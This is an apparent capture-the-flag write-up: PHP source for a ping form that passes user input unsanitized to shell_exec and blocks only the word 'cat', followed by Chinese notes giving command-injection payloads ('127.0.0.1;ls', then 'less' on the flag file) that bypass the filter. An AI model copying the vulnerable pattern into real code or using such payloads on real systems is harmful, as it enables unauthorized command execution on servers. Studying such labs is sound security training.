```php
<html>
     <body>
         <form action="" method="get">
             <input type="text" name='ip' />
             <input type="submit" name="submit" value="提交">
<?php
 $res = FALSE;
 if (isset($_GET['submit'])){
     $ip = $_GET['ip'];
     $m = [];
     if (!preg_match_all("/cat/", $ip, $m)){
         $cmd = shell_exec( 'ping  -c 4 ' . $ip );
         echo $cmd;
     }
}
?>
         </form>
     </body>
 </html>

- 这题过滤了cat

  - Payload: 
   - 127.0.0.1;ls 得到目录后 
   - 127.0.0.1;less flag_11261594711502.php 得到flag


